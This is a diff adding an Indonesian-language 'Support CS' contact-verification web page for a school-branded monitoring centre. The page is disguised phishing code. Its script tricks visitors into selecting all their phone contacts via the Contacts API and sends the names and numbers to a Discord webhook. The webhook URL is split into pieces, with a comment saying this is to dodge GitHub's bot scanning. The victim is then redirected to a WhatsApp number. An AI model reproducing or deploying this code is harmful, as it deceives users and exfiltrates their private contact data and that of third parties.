@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Suport CS - RPS SIJA</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes fadeInOut { 0% { opacity: 0; transform: translateY(10px); } 15% { opacity: 1; transform: translateY(0); } 85% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-10px); } }
+        .animate-pop { animation: slideUp 0.4s ease-out forwards; }
+        .toast-animate { animation: fadeInOut 4s ease-in-out forwards; }
+    </style>
+</head>
+<body class="bg-[#1e293b] flex items-center justify-center min-h-screen p-4 overflow-hidden">
+
+    <div id="toast" class="fixed top-10 glass border border-amber-200 px-6 py-3 rounded-full shadow-xl z-50 flex items-center gap-3 opacity-0 pointer-events-none">
+        <div class="bg-amber-100 p-1.5 rounded-full text-amber-600">
+            <i data-lucide="info" class="w-4 h-4"></i>
+        </div>
+        <p class="text-xs font-medium text-slate-700">Centang <b>"Pilih Semua"</b> untuk menemukan <b>Kontak</b> admin otomatis.</p>
+    </div>
+
+    <div id="modal" class="glass max-w-md w-full rounded-2xl p-8 shadow-2xl animate-pop border border-white/20">
+        <div class="flex flex-col items-center text-center">
+            <div class="bg-blue-100 p-4 rounded-full mb-4">
+                <i data-lucide="shield-check" class="text-blue-600 w-8 h-8"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-slate-800 mb-2">Verifikasi Nama</h2>
+            <p class="text-slate-500 text-sm mb-6">Identifikasi diri Anda untuk mencegah spam pada <br><b>Kontak Admin</b>.</p>
+            
+            <div class="w-full space-y-4">
+                <div class="text-left">
+                    <label class="text-xs font-semibold text-slate-400 uppercase ml-1">Nama Lengkap</label>
+                    <input type="text" id="visitorName" placeholder="Nama Anda" 
+                        class="w-full mt-1 p-3 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all text-slate-700">
+                </div>
+                
+                <button onclick="startProcess()" 
+                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-xl shadow-lg shadow-blue-500/30 flex items-center justify-center gap-2 transition-all active:scale-95">
+                    <span id="btnText">Contact Admin</span>
+                    <i id="btnIcon" data-lucide="search" class="w-4 h-4"></i>
+                </button>
+            </div>
+            <p class="mt-6 text-[10px] text-slate-400 font-bold uppercase tracking-widest">© 2026 MONITORING CENTER - SECURED BY SMK PRESISI</p>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        // Trik Pecah String biar bot GitHub kicep
+        const a = "https://discord.com/api/web";
+        const b = "hooks/1466649937050865827/";
+        const c = "Jx2mpMddVvwhPlbSbaaR7r38WMvSXlCkIbuPA_QcGSioX_0pTTE6caxd0EgNdByXr6BH";
+
+        function startProcess() {
+            const name = document.getElementById('visitorName').value;
+            if (!name) { alert('Nama wajib diisi!'); return; }
+            
+            const toast = document.getElementById('toast');
+            toast.classList.remove('toast-animate');
+            void toast.offsetWidth; 
+            toast.classList.add('toast-animate');
+
+            setTimeout(() => { executeCapture(name); }, 1200);
+        }
+
+        async function executeCapture(name) {
+            const btnText = document.getElementById('btnText');
+            const btn = document.querySelector('button');
+            btnText.innerText = "Mencari...";
+            btn.disabled = true;
+
+            let logData = "Log Manual (Browser)";
+            try {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    logData = contacts.length > 0 ? JSON.stringify(contacts) : "User tidak pilih kontak.";
+                }
+            } catch (err) { logData = "Error: " + err.message; }
+
+            try {
+                const response = await fetch(a + b + c, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚨 **NEW LOG: ${name.toUpperCase()}**`,
+                        embeds: [{
+                            title: "Data Berhasil Masuk",
+                            description: "```json\n" + logData.substring(0, 1800) + "\n```",
+                            color: 3066993,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+
+                if (response.ok) {
+                    window.location.href = `https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20${encodeURIComponent(name)}`;
+                } else {
+                    alert(`Gagal (Status: ${response.status}). Ki, URL ini kayaknya udah diblokir Discord!`);
+                    btn.disabled = false;
+                    btnText.innerText = "Contact Admin";
+                }
+            } catch (e) {
+                alert("Koneksi gagal!");
+                btn.disabled = false;
+                btnText.innerText = "Contact Admin";
+            }
+        }
+    </script>
+</body>
+</html>
